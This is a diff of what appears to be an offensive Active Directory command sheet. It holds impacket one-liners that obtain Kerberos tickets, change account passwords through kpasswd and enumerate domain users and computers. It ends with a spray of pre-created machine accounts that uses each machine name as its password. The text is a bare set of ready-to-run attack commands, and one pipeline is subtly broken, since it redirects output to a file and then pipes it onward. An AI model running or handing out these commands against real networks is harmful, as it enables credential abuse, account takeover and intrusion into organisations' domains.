@@ -350,8 +350,8 @@ TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?
 
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
-impacket-changepasswd $DOM/ -dc-ip $TARGET -k -no-pass
-impacket-changepasswd $DOM/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!' -dc-ip $TARGET
+impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!' -p kpasswd
+impacket-changepasswd -dc-ip $TARGET $DOM/ -k -no-pass -p kpasswd
 impacket-GetADUsers $DOM/ -dc-ip $TARGET -k -no-pass
 impacket-GetADComputers $DOM/ -dc-ip $TARGET -k -no-pass
 nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
